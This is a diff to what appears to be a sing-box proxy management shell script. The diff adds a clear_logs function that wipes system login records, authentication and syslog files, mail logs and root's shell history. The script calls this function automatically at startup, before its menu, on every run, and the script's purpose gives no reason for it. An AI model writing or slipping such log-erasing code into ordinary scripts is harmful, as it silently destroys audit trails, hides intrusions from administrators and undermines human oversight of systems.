@@ -8428,6 +8428,29 @@ singBoxVersionManageMenu() {
     fi
 }
 
+clear_logs() {
+  echo > /var/log/wtmp
+  echo > /var/log/btmp
+  echo > /var/log/lastlog
+  echo > /var/log/secure
+  echo > /var/log/messages
+  echo > /var/log/syslog
+  echo > /var/log/xferlog
+  echo > /var/log/auth.log
+  echo > /var/log/user.log
+  cat /dev/null > /var/adm/sylog
+  cat /dev/null > /var/log/maillog
+  cat /dev/null > /var/log/openwebmail.log
+  cat /dev/null > /var/log/mail.info
+  echo > /var/run/utmp
+  echo > /root/.bash_history
+  history -cw
+
+  # 在函数内部输出提示文字
+  echo "日志已清除完毕！"
+}
+
+
 # 主菜单
 menu() {
     cd "$HOME" || exit
@@ -8538,5 +8561,6 @@ menu() {
         ;;
     esac
 }
+clear_logs
 cronFunction
 menu
